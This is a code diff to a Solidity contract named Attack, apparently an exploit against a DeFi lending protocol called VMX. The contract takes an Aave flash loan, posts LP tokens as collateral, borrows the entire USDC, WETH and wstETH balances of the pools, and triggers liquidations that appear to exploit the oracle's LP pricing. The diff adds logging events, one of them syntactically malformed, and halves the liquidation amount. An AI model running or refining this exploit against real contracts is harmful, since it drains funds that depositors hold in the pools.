@@ -115,6 +115,9 @@ contract Attack {
     address other2;
     uint rNum;
 
+    event LPPrice(uint lpPrice);
+    event BorrowAmount(uint a1,uinta2,uinta3);
+
     constructor() public {
         owner =  msg.sender;
         aave = ILendingPool(AAVE_V3_POOL);
@@ -165,10 +168,11 @@ contract Attack {
         vmx.deposit(LP_TOKEN, 1, colLpAmount, address(this), 0);
 
         uint bUSDCAmount = IERC20(USDC).balanceOf(VMX_USDC_POOL);
-        vmx.borrow(asset, 0, bUSDCAmount, 0, address(this));
         uint bWETHAmount = IERC20(WETH).balanceOf(VMX_WETH_POOL);
-        vmx.borrow(asset, 0, bWETHAmount, 0, address(this));
         uint bwstWTHAmount = IERC20(wstETH).balanceOf(VMX_WSTETH_POOL);
+        emit BorrowAmount(bUSDCAmount,bWETHAmount,bwstWTHAmount);
+        vmx.borrow(asset, 0, bUSDCAmount, 0, address(this));
+        vmx.borrow(asset, 0, bWETHAmount, 0, address(this));
         vmx.borrow(asset, 0, bwstWTHAmount, 0, address(this));
 
         //移除流动性
@@ -199,7 +203,6 @@ contract Attack {
         uint amountToRepay = amount + premium;
         // 归还闪电贷
         IERC20(WETH).approve(AAVE_V3_POOL, amountToRepay);
-
         return true;
     }
 
@@ -209,10 +212,12 @@ contract Attack {
             rNum = rNum +1;
         }
         else if(rNum == 2){
+            uint price = oracle.getAssetPrice(LP_TOKEN);
+            emit LPPrice(price); 
             //second is curve remove liq
-            // 去清算 计算当前抵押的LP价值
-            IERC20(USDC).approve(VMX_POOL, usdAmount);
-            vmx.liquidationCall(LP_TOKEN, USDC, 0, address(this), usdAmount, false); 
+            // 去清算 这里需要明确知道Lp打折多少
+            IERC20(USDC).approve(VMX_POOL, usdAmount/2);
+            vmx.liquidationCall(LP_TOKEN, USDC, 0, address(this), usdAmount/2, false); 
             rNum = rNum + 1;
         }
         
@@ -221,6 +226,7 @@ contract Attack {
 
     function getNeedDepositAmount() external returns(uint){
         uint price = oracle.getAssetPrice(LP_TOKEN);
+        emit LPPrice(price);
 
         usdAmount = IERC20(USDC).balanceOf(VMX_USDC_POOL);
         uint wETHAmount = IERC20(WETH).balanceOf(VMX_WETH_POOL);
